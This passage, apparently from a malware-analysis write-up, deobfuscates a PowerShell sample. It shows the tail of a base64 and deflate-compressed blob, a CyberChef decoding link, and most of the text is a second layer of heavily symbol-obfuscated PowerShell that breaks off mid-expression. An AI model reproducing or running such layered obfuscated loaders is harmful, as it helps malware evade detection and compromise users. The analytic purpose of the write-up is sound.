pLTmzUz69LQuqGitVyRCVnAulz7hht+iRRNvvUy3MZQzzmi/c3e15t2GeehIzcaC7DzoRR7grkqbKP08XxBv8rNumbyZGE0xTBpRtU5lm/1IqhK4VgLDFsAg3uQbEOgMLYgizAysi2h2beU1glr1rMMuSQyeHRPkrJct3kgewg9Db6X1NlWwGedLp3/Fx1DMY6znSq8LYow1UyieoAJaEzDgM4iwTRDqRL12gOb3BYp//7xSXG0R2mDoJY9lPi71wWBnRG79fgbp22BDoe7oSco/iCnbkfd3ox1VLcA5NzX7TWXVrPMK3gygTScoG9mOxRI/NoA2RW1LGByjXZWBQo+om8mgU9gNWifALQLWNDcaUZwPHZ0oDLKKobzXd29jmyoadYaHCzLlbLzYNnbYaRgi15UztPxxK+KssaGJWlGQzgUuwW3jU+WwuGeDktjTv3gjQW6A5W6XUsljL9ZcsrSaCE50H1AOruJC0+YyA+3xVKplkPvs8km45EmLc2kBfbmeUE55KT6BwXpJnnSBTmsKVeft+ZzWlGNPf6ctRTxLQbkUjW6EtzjYayOTDgl3nj9yZhqJa0ff+L9Y0HQFHA8qlzUdbmn8H+sgmysVoEev4dda5+ofBAq+8fYVeJljfI4esQGaWKvgTG5vGijY0ZQyE2+zVbDOoMzhzzYrkbs9KgJ5cw9hm6sfuxQVFrAgQDerQF86LxjARb/8vYSMKDgOIqMba4t5jmJQ99LOmKcyzt8GxIu5TScZ+atQaLwH7I/AmzsRwirTB4ZJhapuXwSiLNriW3hxha6VOgiFOhKPKZdpkVgaKKuUR8Masad9o8wTDIkQ+mGi3j1p6V8BQ13V2buooVzQljruUTd8I8VQD1e42lYEUfcObITpLliTT3UQ561hstjh0EUgrJhbhe6kKFyIxGjtJql9EGcWyNAOecL5g0tkM0aBA+VH6ELRJk60ACssuZ8ewA1aLQgUo+mMDYHYf5uerzA0g+RD1zytmEgEAlrBCgCQajMaDBc8U6NtPDdf4mCqdEPX2fxRVzBX7uG8+l+4mZ43ekFmANFSR1e1gsaFjxr9BhjJUvHO4up75JzQcXrfnkmrvlKbGbS1KWrfynVIQ8FDI6/3oSIMEiZzNjWKm0xmK/euqE0fHCUPpNoCvfOPmdLbWlnECkVh6ldqXGzzfhKOEgZrFV078cu5fG3o1ZuuRsRIJ711kz3wHa6AMje8DuY94OMX5Hqg1PMTLHhSk5EOuoonke5FcUfJfaeD+abvYte/1x6LH8qoroRVXESpzMVPE6BIujksnOvkPj6KN/ZPmxa0SKpTqvqvQBi5PHZ667Q1xIEaAAf+gN0risscg70kfaEqGMXdkSwUuqSeNvciaJuyo+jHVCPAo+cjTU3RP3rnkKaRCwCs+5XKRWx21EyLvAs5mlM+fkCBqtomDbboUd5FAB8IiBweiAE2rJxWm6lX6pM2G+iVIAXFn/C24IBKMfg/E51Ijr6IhfeKBPEkz0QU/YLF7CKC4oUOUYMPbrTzloBvKRp3uxTDvTKIOZOX0ODmxaAz4e4K/OcSr8eGKyASt32X6gKq1t66IYsYgX7wNQ90KTc49q+TTF/dt+wQfsUX6b93p/3pe30M4X8=') ,[system.iO.coMPressIoN.CoMpressIonMODe]::DecoMPREsS)) , [TExT.EncoDINg]::ascII) ).REaDtOeNd( )
```

[Decoding from b64 & decompressing](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)&input=clZ0YnJ0czRETjJLYW1RYUJ3YW1DeWlDeVQ0Q3IrVFdXZnRZbGl5SjVEbVUzUFludUpZbGl1TGo4Q0hmT1lUN1kzN2RmNFh3ZmI3L2MzOThoWEQ3K3ZuNnRqMURXUGEvNThjV1FocGM5citlNmVWMmpIeWVjV1NmdDZUUkVPTGMyOWZydlQzbmswNVprK2pGUlk4MDdSUDNLUFB5cktVUWZ1ems5bG5mM2ovU0xucm1UaTlSUzl2R3Q3YzFIRFRWemt0RE1jOWM0OXM2cnpKYmVJeTdIek5ueU9aSjhpUjR2NzM5ZVZFdXR4K05ZTXFtNWhpUjZITjZUd2MzMDIxK2ZVVUswenV6RThKYTMreXJqamZUUVNUdHNTOWNsLzF0Q1B2SzgrMnVsRU9IMDduNHYwUndYeFZIcG5YYXF1Nm42ZDg1RTBnYm5PU2pOZ29GdWNIeGZqMDJsK3p0Zjc2TEFjbTFoMDZtZDZKN3NCSFp5akpMeitXTTBXRDJ3V3dXV1lLRmliU0pZRE5MNFh4N21sSWNQSmEzZ3RuRm1oaFBMUDJjb2hiaWp2RklTMzU0SmdrZVAzbHMzVEt6UzEyUXRza0Q4U0ZwcFF4RkswMi9TOUwyT1hRSVNLd3JlNWNKWlFrZ3pOWmtxNjVUb3JGNmEzWnBpR2R4SW5QRU5FZHdFdWZzY2kzYldqa2VQM0ZsdzF3V3BwTEtUcWVaVXpjVHhPVWtzVjJjbTQ1YzJNTWJmZXcraWtGKzBrcDZWclNyMVpqUjdERktmM25QeW1uVWhxVVdKeHZERkVaVmg4WGhoUmtydm9VUUd4Yk4wbmdXUFRhZ0ZPQWFxN1VzVFVTeWRQZ3JtaWJQMHZwS1BZcml1NEFGT21DaGx5eW9Pa1Y2UG83cmFLVnFzeHI0TE5jQjA2eWtWbUpEaXExc2pWQnJURUJWamgvck5zMkFQcmoybS9RKzhYU094ZE1nUzByYkFmRXJIK3VhblJXS0VvR0NOT2hDeFJqc0tEYWNBekpIZlZwYmxIYjBMRGNOb1dJUE1KUkVDNG0zZkt5YlFiOGphNENTSjJjQzZHOVFlVEVLaDBjbTRySDdIdXgwdFpGWTFIRlFUTlBhbDRBTlNVTmYwb1kwS3dmVWJrbkFYZWxsekN1dzhUTWxLbEVJUkFVZXJWeXVuRlBnbERBOVlrYXQrM0V6U3ZSYkV5MGpJSW5ncU5XS0pWbGR0Y0thaUFINWJsb2NkVTBHWDhtWXlYZWtIdWNOUkdtZEJRb0xoS2F0L0txMWJsL1BKQTFaTlZKOEdHN3pMRkNiaFBGN21VNDJpWk03QUIxTHhEM2xhOTcrWm5mT2prd1lwTFRtelV6NjlMUXVxR2l0VnlSQ1ZuQXVsejdoaHQraVJSTnZ2VXkzTVpRenptaS9jM2UxNXQyR2VlaEl6Y2FDN0R6b1JSN2dya3FiS1AwOFh4QnY4ck51bWJ5WkdFMHhUQnBSdFU1bG0vMUlxaEs0VmdMREZzQWczdVFiRU9nTUxZZ2l6QXlzaTJoMmJlVTFnbHIxck1NdVNReWVIUlBrckpjdDNrZ2V3ZzlEYjZYMU5sV3dHZWRMcDMvRngxRE1ZNnpuU3E4TFlvdzFVeWllb0FKYUV6RGdNNGl3VFJEcVJMMTJnT2IzQllwLy83eFNYRzBSMm1Eb0pZOWxQaTcxd1dCblJHNzlmZ2JwMjJCRG9lN29TY28vaUNuYmtmZDNveDFWTGNBNU56WDdUV1hWclBNSzNneWdUU2NvRzltT3hSSS9Ob0EyUlcxTEdCeWpYWldCUW8rb204bWdVOWdOV2lmQUxRTFdORGNhVVp3UEhaMG9ETEtLb2J6WGQyOWpteW9hZFlhSEN6TGxiTHpZTm5iWWFSZ2kxNVV6dFB4eEsrS3NzYUdKV2xHUXpnVXV3VzNqVStXd3VHZURrdGpUdjNnalFXNkE1VzZYVXNsakw5WmNzclNhQ0U1MEgxQU9ydUpDMCtZeUErM3hWS3Bsa1B2czhrbTQ1RW1MYzJrQmZibWVVRTU1S1Q2QndYcEpublNCVG1zS1ZlZnQrWnpXbEdOUGY2Y3RSVHhMUWJrVWpXNkV0empZYXlPVERnbDNuajl5WmhxSmEwZmYrTDlZMEhRRkhBOHFselVkYm1uOEgrc2dteXNWb0VldjRkZGE1K29mQkFxKzhmWVZlSmxqZkk0ZXNRR2FXS3ZnVEc1dkdpalkwWlF5RTIrelZiRE9vTXpoenpZcmticzlLZ0o1Y3c5aG02c2Z1eFFWRnJBZ1FEZXJRRjg2THhqQVJiLzh2WVNNS0RnT0lxTWJhNHQ1am1KUTk5TE9tS2N5enQ4R3hJdTVUU2NaK2F0UWFMd0g3SS9BbXpzUndpclRCNFpKaGFwdVh3U2lMTnJpVzNoeGhhNlZPZ2lGT2hLUEtaZHBrVmdhS0t1VVI4TWFzYWQ5bzh3VERJa1ErbUdpM2oxcDZWOEJRMTNWMmJ1b29WelFsanJ1VVRkOEk4VlFEMWU0MmxZRVVmY09iSVRwTGxpVFQzVVE1NjFoc3RqaDBFVWdySmhiaGU2a0tGeUl4R2p0SnFsOUVHY1d5TkFPZWNMNWcwdGtNMGFCQStWSDZFTFJKazYwQUNzc3VaOGV3QTFhTFFnVW8rbU1EWUhZZjV1ZXJ6QTBnK1JEMXp5dG1FZ0VBbHJCQ2dDUWFqTWFEQmM4VTZOdFBEZGY0bUNxZEVQWDJmeFJWekJYN3VHOCtsKzRtWjQzZWtGbUFORlNSMWUxZ3NhRmp4cjlCaGpKVXZITzR1cDc1SnpRY1hyZm5rbXJ2bEtiR2JTMUtXcmZ5blZJUThGREk2LzNvU0lNRWlaek5qV0ttMHhtSy9ldXFFMGZIQ1VQcE5vQ3ZmT1BtZExiV2xuRUNrVmg2bGRxWEd6emZoS09FZ1pyRlYwNzhjdTVmRzNvMVp1dVJzUklKNzExa3ozd0hhNkFNamU4RHVZOTRPTVg1SHFnMVBNVExIaFNrNUVPdW9vbmtlNUZjVWZKZmFlRCthYnZZdGUvMXg2TEg4cW9yb1JWWEVTcHpNVlBFNkJJdWprc25PdmtQajZLTi9aUG14YTBTS3BUcXZxdlFCaTVQSFo2NjdRMXhJRWFBQWYrZ04wcmlzc2NnNzBrZmFFcUdNWGRrU3dVdXFTZU52Y2lhSnV5bytqSFZDUEFvK2NqVFUzUlAzcm5rS2FSQ3dDcys1WEtSV3gyMUV5THZBczVtbE0rZmtDQnF0b21EYmJvVWQ1RkFCOElpQndlaUFFMnJKeFdtNmxYNnBNMkcraVZJQVhGbi9DMjRJQktNZmcvRTUxSWpyNkloZmVLQlBFa3owUVUvWUxGN0NLQzRvVU9VWU1QYnJUemxvQnZLUnAzdXhURHZUS0lPWk9YME9EbXhhQXo0ZTRLL09jU3I4ZUdLeUFTdDMyWDZnS3ExdDY2SVlzWWdYN3dOUTkwS1RjNDlxK1RURi9kdCt3UWZzVVg2YjkzcC8zcGUzME00WDg9&oeol=NEL), we get the following extra layer of obfuscated powershell code:  
```powershell
(  ')(@'|  &('%'){  ${;@!}=  +  $()}  {  ${;+}  =${;@!}}{  ${~=}  =  ++${;@!}  }  {${@[}=(  ${;@!}  =${;@!}  +  ${~=})}  {${~}=  (  ${;@!}=${;@!}+  ${~=}  )  }{${![/}  =  (  ${;@!}=${;@!}  +${~=})  }  {  ${$] }=  (${;@!}  =${;@!}+${~=}  )  }  {  ${]}  =(${;@!}  =  ${;@!}  +  ${~=})  }{  ${](}=  (  ${;@!}=${;@!}+${~=}  )}  {  ${'$[}=  (  ${;@!}=${;@!}+${~=}  )}{${@$/}=(  ${;@!}=  ${;@!}+${~=})  }  {  ${)}  ="["  +  "$(@{}  )"[  ${](}  ]  +  "$(@{  })"[  "${~=}${@$/}"  ]+"$(  @{})"[  "${@[}${;+}"]  +  "$?"[  ${~=}]  +"]"}{  ${;@!}="".("$(  @{  })"["${~=}${![/}"]  +  "$(  @{})"[  "${~=}${]}"  ]  +  "$(@{  })  "[  ${;+}  ]  +  "$(  @{}  )  "[${![/}]  +"$?"[${~=}  ]  +"$(@{  })"[${~}  ])  }{${;@!}=  "$(  @{})  "[  "${~=}${![/}"  ]+"$(@{})  "[${![/}  ]+"${;@!}"[  "${@[}${](}"  ]  }  )  ;"${)}${~}${]}+${)}${~=}${;+}${;+}+${)}${]}${~=}  +${)}${~}${![/}  +${)}${![/}${@$/}  +${)}${$] }${$] }+  ${)}${$] }${;+}  +${)}${![/}${]}+${)}${$] }${;+}+  ${)}${![/}${@$/}  +${)}${![/}${]}+${)}${$] }${;+}  +  ${)}${![/}${'$[}+${)}${![/}${]}+${)}${$] }${](}+${)}${$] }${![/}  +${)}${~}${![/}  +${)}${$] }${@$/}  +${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${~=}${$] }  +  ${)}${]}${~=}+  ${)}${$] }${@[}  +  ${)}${$] }${@$/}+  ${)}${~}${@[}  +  ${)}${~}${]}+${)}${@$/}${'$[}  +${)}${]}${~=}+  ${)}${$] }${~}  +  ${)}${$] }${$] }  +  ${)}${$] }${@$/}  +${)}${~}${@[}  +${)}${](}${~=}+  ${)}${~=}${;+}${~=}+  ${)}${~=}${~=}${]}  +${)}${![/}${$] }  +${)}${]}${](}+  ${)}${~=}${;+}${![/}+${)}${~=}${;+}${$] }+  ${)}${~=}${;+}${'$[}  +${)}${~=}${;+}${;+}  +${)}${](}${~}  +  ${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}+${)}${~=}${;+}${@$/}+  ${)}${~}${@[}  +  ${)}${~}${![/}  +${)}${![/}${]}  +${)}${~}${![/}+  ${)}${~}${@[}+  ${)}${~=}${@[}${![/}+  ${)}${~}${@[}  +${)}${](}${;+}+  ${)}${~=}${~=}${~=}+${)}${~=}${~=}${![/}+${)}${~=}${;+}${~=}  +${)}${@$/}${](}+${)}${@$/}${@$/}+${)}${~=}${;+}${![/}+${)}${![/}${$] }+  ${)}${](}${@$/}+${)}${@$/}${'$[}  +${)}${~=}${;+}${]}+  ${)}${~=}${;+}${~=}  +${)}${@$/}${@$/}  +  ${)}${~=}${~=}${]}+  ${)}${~}${@[}  +${)}${~=}${@[}${~}  +  ${)}${~}${]}  +  ${)}${@$/}${](}+${)}${]}${~=}+  ${)}${@$/}${~=}  +  ${)}${'$[}${~}  +  ${)}${~=}${@[}${~=}+${)}${~=}${~=}${$] }  +  ${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}+  ${)}${~=}${;+}${@$/}  +  ${)}${![/}${]}+${)}${]}${](}+  ${)}${~=}${~=}${~=}+  ${)}${~=}${~=}${;+}+  ${)}${~=}${~=}${'$[}+  ${)}${~=}${;+}${~=}+  ${)}${~=}${~=}${![/}+${)}${~=}${~=}${]}  +${)}${@$/}${~}  +${)}${$] }${'$[}+  ${)}${$] }${'$[}+  ${)}${'$[}${![/}+${)}${~=}${~=}${~=}+  ${)}${]}${]}+${)}${@$/}${](}  +${)}${~=}${~=}${$] }+  ${)}${~=}${;+}${~=}+${)}${$] }${![/}  +  ${)}${$] }${@[}+${)}${'$[}${~}  +${)}${~=}${~=}${]}  +  ${)}${~=}${~=}${![/}+  ${)}${~=}${;+}${$] }+${)}${~=}${~=}${;+}+  ${)}${~=}${;+}${~}+  ${)}${![/}${;+}+  ${)}${~}${]}+${)}${]}${@$/}  +${)}${~=}${~=}${;+}+  ${)}${@$/}${@$/}  +  ${)}${![/}${]}+${)}${](}${~=}  +${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${]}  +  ${)}${]}${]}+  ${)}${~=}${@[}${~=}+${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}  +${)}${~=}${~=}${$] }+${)}${![/}${;+}  +${)}${~}${]}  +  ${)}${@$/}${$] }  +  ${)}${![/}${]}+  ${)}${](}${'$[}+  ${)}${@$/}${](}  +${)}${~=}${;+}${@$/}  +${)}${~=}${;+}${~=}+${)}${![/}${~=}+  ${)}${![/}${~=}  +${)}${$] }${@$/}+  ${)}${~}${@[}  +${)}${~}${]}+${)}${'$[}${@[}+${)}${]}${~=}  +  ${)}${~=}${@[}${~}+${)}${~}${]}  +${)}${]}${'$[}  +  ${)}${![/}${![/}  +${)}${~}${]}  +  ${)}${](}${$] }  +${)}${]}${~=}  +${)}${~}${]}+${)}${]}${$] }+${)}${~=}${~=}${![/}  +  ${)}${~=}${;+}${~}  +${)}${~=}${~=}${$] }+${)}${$] }${@$/}  +${)}${~}${]}+  ${)}${'$[}${~}+${)}${]}${~=}+  ${)}${![/}${'$[}+${)}${![/}${]}+  ${)}${![/}${]}  +  ${)}${$] }${;+}  +  ${)}${$] }${~}  +${)}${$] }${~}  +${)}${$] }${@$/}  +  ${)}${![/}${'$[}  +${)}${![/}${]}+${)}${![/}${]}  +  ${)}${$] }${;+}+  ${)}${$] }${~}+  ${)}${$] }${~}  +${)}${~=}${@[}${![/}  +${)}${~}${](}+${)}${~=}${@[}${~}  +${)}${~}${]}  +  ${)}${](}${![/}  +${)}${]}${~=}  +${)}${![/}${;+}+${)}${~}${]}+${)}${](}${![/}+${)}${![/}${~}  +  ${)}${~}${]}  +  ${)}${'$[}${~}+  ${)}${@$/}${~=}+  ${)}${~}${]}+${)}${@$/}${$] }+${)}${@$/}${~}+  ${)}${![/}${~}  +  ${)}${~}${]}  +  ${)}${](}${$] }  +${)}${@$/}${~=}  +${)}${~}${]}  +${)}${@$/}${$] }+  ${)}${~}${](}  +${)}${~}${]}  +  ${)}${](}${$] }  +  ${)}${![/}${]}+${)}${](}${]}  +${)}${~=}${;+}${~=}+${)}${~=}${~=}${;+}  +  ${)}${~=}${;+}${~}+  ${)}${~=}${~=}${]}  +${)}${~=}${;+}${![/}  +${)}${@$/}${~}+${)}${![/}${~=}+  ${)}${~}${](}+${)}${$] }${;+}+${)}${$] }${~}+${)}${$] }${![/}  +  ${)}${$] }${@$/}  +  ${)}${~}${]}+${)}${'$[}${~}+  ${)}${@$/}${~=}+  ${)}${~}${]}  +  ${)}${@$/}${$] }  +${)}${@$/}${~}  +  ${)}${![/}${![/}  +  ${)}${~}${]}  +${)}${'$[}${~}+${)}${@$/}${~=}  +${)}${~}${]}+  ${)}${](}${![/}+  ${)}${@$/}${~}  +${)}${]}${~=}+${)}${~}${]}+  ${)}${'$[}${~}+${)}${@$/}${~=}+${)}${~}${]}  +  ${)}${](}${![/}  +${)}${@$/}${~}+  ${)}${![/}${![/}  +  ${)}${~}${]}  +  ${)}${'$[}${~}  +${)}${@$/}${~=}  +${)}${~}${]}  +${)}${@$/}${$] }  +  ${)}${@$/}${~}  +${)}${~=}${@[}${$] }+${)}${$] }${@$/}  +  ${)}${~}${]}+  ${)}${]}${'$[}+  ${)}${~=}${@[}${![/}+${)}${~}${](}  +  ${)}${~=}${@[}${~}  +${)}${~}${]}  +${)}${](}${~}+${)}${]}${~=}  +${)}${![/}${;+}+  ${)}${~}${]}+  ${)}${](}${~}  +  ${)}${![/}${~}+  ${)}${![/}${@$/}+  ${)}${![/}${~=}  +  ${)}${~}${](}  +${)}${$] }${;+}  +${)}${$] }${~}+${)}${$] }${![/}+  ${)}${$] }${@$/}+  ${)}${~}${]}+  ${)}${](}${@[}  +${)}${]}${~=}+${)}${![/}${;+}+  ${)}${~}${]}  +${)}${](}${@[}+  ${)}${![/}${~}  +${)}${~}${]}+${)}${'$[}${~}+  ${)}${@$/}${~=}  +  ${)}${~}${]}+${)}${](}${~}+${)}${@$/}${~}+${)}${![/}${~=}  +  ${)}${~}${](}  +${)}${$] }${;+}+  ${)}${$] }${~}  +  ${)}${$] }${![/}  +${)}${$] }${@$/}+${)}${~}${]}  +${)}${'$[}${~}+${)}${@$/}${~=}+  ${)}${~}${]}  +${)}${](}${~}+${)}${@$/}${~}+${)}${![/}${![/}+  ${)}${~}${]}+  ${)}${'$[}${~}+  ${)}${@$/}${~=}+  ${)}${~}${]}+  ${)}${](}${@[}  +${)}${@$/}${~}  +  ${)}${]}${~=}  +${)}${~}${]}+${)}${'$[}${~}+  ${)}${@$/}${~=}  +  ${)}${~}${]}+${)}${](}${@[}+${)}${@$/}${~}+  ${)}${![/}${![/}  +  ${)}${~}${]}+  ${)}${'$[}${~}  +${)}${@$/}${~=}+  ${)}${~}${]}  +  ${)}${](}${~}+${)}${@$/}${~}  +  ${)}${$] }${@$/}  +  ${)}${~}${]}  +  ${)}${@$/}${$] }  +${)}${![/}${$] }+  ${)}${@$/}${'$[}+${)}${~=}${@[}${;+}+  ${)}${~=}${~=}${~=}  +  ${)}${~=}${~=}${![/}+  ${)}${~}${]}+  ${)}${'$[}${~}+${)}${@$/}${~=}+  ${)}${![/}${;+}+  ${)}${~}${]}+${)}${'$[}${~}+${)}${@$/}${~=}+  ${)}${~}${]}+  ${)}${](}${~}  +${)}${@$/}${~}  +${)}${![/}${~}  +  ${)}${~}${]}+  ${)}${'$[}${~}  +${)}${@$/}${~=}+${)}${~}${]}  +${)}${](}${@[}+${)}${@$/}${~}  +  ${)}${![/}${~=}+  ${)}${~}${](}  +  ${)}${$] }${;+}+  ${)}${$] }${~}  +  ${)}${$] }${![/}  +${)}${@$/}${~}+  ${)}${~=}${@[}${$] }+  ${)}${~=}${@[}${$] }+  ${)}${$] }${@$/}+  ${)}${~}${@[}  +${)}${~}${]}  +  ${)}${]}${@$/}  +${)}${~=}${~=}${;+}  +  ${)}${@$/}${@$/}+  ${)}${~}${@[}  +  ${)}${]}${~=}  +${)}${~}${@[}  +  ${)}${@$/}${~=}+${)}${'$[}${~}  +${)}${~=}${@[}${~=}  +  ${)}${~=}${~=}${$] }+  ${)}${~=}${~=}${]}  +  ${)}${~=}${;+}${~=}  +${)}${~=}${;+}${@$/}+  ${)}${![/}${]}+${)}${'$[}${![/}+${)}${~=}${;+}${~=}+${)}${~=}${@[}${;+}  +  ${)}${~=}${~=}${]}  +${)}${![/}${]}  +  ${)}${]}${@$/}  +  ${)}${~=}${~=}${;+}  +  ${)}${@$/}${@$/}+${)}${~=}${~=}${~=}  +${)}${~=}${;+}${;+}  +  ${)}${~=}${;+}${$] }+  ${)}${~=}${~=}${;+}  +${)}${~=}${;+}${~}+  ${)}${@$/}${~}+${)}${$] }${'$[}+${)}${$] }${'$[}+  ${)}${]}${$] }  +  ${)}${'$[}${~}+  ${)}${]}${](}+${)}${](}${~}+  ${)}${](}${~}  +  ${)}${$] }${@$/}  +${)}${~}${@[}+${)}${~}${]}  +${)}${~=}${~=}${@[}+${)}${~}${@[}+  ${)}${]}${~=}  +${)}${~}${@[}+  ${)}${~}${]}+  ${)}${]}${@$/}+  ${)}${~=}${~=}${;+}+  ${)}${@$/}${@$/}+  ${)}${![/}${]}  +${)}${](}${~=}  +${)}${~=}${;+}${~=}  +${)}${~=}${~=}${]}  +${)}${]}${]}+  ${)}${~=}${@[}${~=}+${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${$] }+${)}${![/}${;+}  +${)}${~}${@$/}+${)}${@$/}${~=}+  ${)}${'$[}${~}  +  ${)}${~=}${@[}${~=}  +${)}${~=}${~=}${$] }  +  ${)}${~=}${~=}${]}  +  ${)}${~=}${;+}${~=}  +${)}${~=}${;+}${@$/}+  ${)}${![/}${]}  +  ${)}${](}${~}+${)}${](}${@$/}+  ${)}${![/}${]}+  ${)}${](}${;+}+${)}${~=}${;+}${$] }+  ${)}${~=}${;+}${'$[}+  ${)}${~=}${;+}${~=}  +${)}${@$/}${~}  +  ${)}${$] }${'$[}+  ${)}${$] }${'$[}+  ${)}${'$[}${@[}+  ${)}${~=}${;+}${~=}  +  ${)}${@$/}${](}  +${)}${~=}${;+}${;+}+  ${)}${]}${$] }+  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${;+}${'$[}+${)}${]}${]}  +${)}${~=}${@[}${~=}+${)}${~=}${~=}${]}  +  ${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${$] }  +  ${)}${![/}${;+}  +  ${)}${~}${]}  +${)}${@$/}${$] }+${)}${![/}${]}  +${)}${](}${;+}+${)}${~=}${~=}${](}+${)}${~=}${;+}${'$[}+${)}${~=}${;+}${'$[}+${)}${](}${'$[}  +  ${)}${@$/}${](}  +  ${)}${~=}${;+}${@$/}  +  ${)}${~=}${;+}${~=}+  ${)}${![/}${~=}  +${)}${~}${@$/}  +  ${)}${![/}${~=}  +  ${)}${$] }${@$/}+${)}${~}${@[}  +  ${)}${~}${]}  +${)}${~=}${@[}${@[}  +${)}${~}${@[}+  ${)}${]}${~=}  +${)}${~}${@[}  +  ${)}${~}${]}+  ${)}${]}${@$/}+  ${)}${~=}${~=}${;+}+  ${)}${@$/}${@$/}  +${)}${![/}${]}  +${)}${](}${~=}  +${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${]}  +${)}${]}${]}  +  ${)}${~=}${@[}${~=}  +${)}${~=}${~=}${]}+  ${)}${~=}${;+}${~=}  +${)}${~=}${~=}${$] }  +${)}${![/}${;+}+${)}${@$/}${~=}+  ${)}${'$[}${~}  +  ${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${$] }+  ${)}${~=}${~=}${]}  +${)}${~=}${;+}${~=}+${)}${~=}${;+}${@$/}+  ${)}${![/}${]}  +  ${)}${](}${~}+${)}${](}${@$/}+  ${)}${![/}${]}  +${)}${](}${;+}  +${)}${~=}${;+}${$] }  +  ${)}${~=}${;+}${'$[}+${)}${~=}${;+}${~=}  +  ${)}${@$/}${~}+  ${)}${$] }${'$[}+${)}${$] }${'$[}  +${)}${'$[}${@[}  +  ${)}${~=}${;+}${~=}  +${)}${@$/}${](}+  ${)}${~=}${;+}${;+}  +${)}${]}${$] }  +${)}${~=}${;+}${'$[}  +  ${)}${~=}${;+}${'$[}  +${)}${]}${]}+${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${]}  +${)}${~=}${;+}${~=}  +${)}${~=}${~=}${$] }+  ${)}${![/}${;+}+${)}${~}${]}  +  ${)}${@$/}${$] }  +  ${)}${![/}${]}  +  ${)}${](}${;+}  +${)}${~=}${~=}${](}  +${)}${~=}${;+}${'$[}+  ${)}${~=}${;+}${'$[}  +  ${)}${](}${'$[}+${)}${@$/}${](}+${)}${~=}${;+}${@$/}  +  ${)}${~=}${;+}${~=}  +${)}${![/}${~=}+${)}${![/}${~=}  +  ${)}${$] }${@$/}  +${)}${~}${@[}  +${)}${~}${]}  +${)}${~=}${~=}${](}  +${)}${~}${@[}+${)}${]}${~=}  +${)}${~}${@[}  +  ${)}${![/}${;+}+  ${)}${~}${'$[}  +  ${)}${~}${@[}+${)}${~}${]}+${)}${'$[}${@[}+${)}${~}${@[}  +${)}${~}${]}  +${)}${~=}${@[}${@[}  +${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${~=}${@[}  +  ${)}${![/}${~=}+  ${)}${$] }${@$/}+${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${;+}${~=}  +  ${)}${~}${@[}  +${)}${]}${~=}+${)}${~}${@[}+${)}${@$/}${~=}+  ${)}${'$[}${~}  +${)}${~=}${@[}${~=}  +  ${)}${~=}${~=}${$] }+${)}${~=}${~=}${]}+  ${)}${~=}${;+}${~=}+${)}${~=}${;+}${@$/}  +${)}${![/}${]}  +${)}${]}${](}  +${)}${~=}${~=}${~=}  +${)}${~=}${~=}${;+}+${)}${~=}${~=}${'$[}  +  ${)}${~=}${;+}${~=}+${)}${~=}${~=}${![/}  +  ${)}${~=}${~=}${]}  +  ${)}${@$/}${~}+${)}${$] }${'$[}  +${)}${$] }${'$[}+  ${)}${'$[}${![/}  +  ${)}${~=}${~=}${~=}+  ${)}${]}${]}+${)}${@$/}${](}  +  ${)}${~=}${~=}${$] }  +${)}${~=}${;+}${~=}  +${)}${$] }${![/}+${)}${$] }${@[}  +${)}${'$[}${~}+  ${)}${~=}${~=}${]}  +${)}${~=}${~=}${![/}  +${)}${~=}${;+}${$] }  +${)}${~=}${~=}${;+}  +  ${)}${~=}${;+}${~}+  ${)}${![/}${;+}  +  ${)}${~}${]}+${)}${~=}${~=}${](}  +  ${)}${![/}${~=}  +${)}${$] }${@$/}  +  ${)}${~}${@[}  +  ${)}${~}${]}+  ${)}${~=}${;+}${'$[}  +  ${)}${]}${~=}+  ${)}${~}${]}+  ${)}${~=}${;+}${~=}+  ${)}${![/}${]}+  ${)}${](}${]}  +${)}${~=}${;+}${~=}+${)}${~=}${~=}${;+}+${)}${~=}${;+}${~}+  ${)}${~=}${~=}${]}+${)}${~=}${;+}${![/}  +  ${)}${$] }${@$/}  +  ${)}${~}${@[}+${)}${~}${]}+  ${)}${~=}${~=}${![/}  +${)}${]}${~=}+  ${)}${~}${![/}  +${)}${~}${![/}  +${)}${$] }${@$/}  +  ${)}${~}${@[}  +${)}${~}${]}+  ${)}${~=}${~=}${;+}+${)}${]}${~=}+  ${)}${![/}${'$[}  +  ${)}${$] }${@$/}  +  ${)}${~}${@[}  +  ${)}${~=}${~=}${@$/}+${)}${~=}${;+}${![/}+${)}${~=}${;+}${$] }+  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${;+}${~=}+${)}${~}${@[}  +${)}${![/}${;+}  +  ${)}${~}${]}+${)}${~=}${~=}${;+}+  ${)}${~}${@[}  +  ${)}${![/}${$] }+${)}${~=}${;+}${'$[}  +${)}${~=}${;+}${~=}  +  ${)}${~}${@[}+${)}${![/}${;+}+  ${)}${~}${]}  +  ${)}${~=}${;+}${'$[}+${)}${![/}${](}  +${)}${~}${]}  +  ${)}${@$/}${'$[}+${)}${![/}${~=}  +  ${)}${![/}${~=}  +${)}${~}${@[}+${)}${~=}${@[}${~}  +${)}${~}${@[}  +${)}${~}${]}  +  ${)}${@$/}${@$/}  +  ${)}${]}${~=}  +  ${)}${~}${]}  +${)}${@$/}${'$[}  +  ${)}${$] }${@$/}+${)}${~}${@[}  +${)}${~=}${;+}${$] }  +  ${)}${~=}${;+}${@[}  +${)}${~}${@[}+${)}${![/}${;+}  +${)}${![/}${;+}  +  ${)}${~}${]}+  ${)}${~=}${~=}${;+}+  ${)}${![/}${@[}  +  ${)}${~}${]}  +${)}${@$/}${'$[}+${)}${![/}${~=}  +${)}${![/}${~}+${)}${~}${]}  +  ${)}${@$/}${@$/}  +${)}${~}${@[}  +${)}${![/}${$] }  +${)}${~=}${;+}${~}+${)}${~=}${~=}${]}  +  ${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${;+}${'$[}  +${)}${![/}${~=}+${)}${~}${@[}  +  ${)}${~=}${@[}${~}+${)}${~}${@[}+  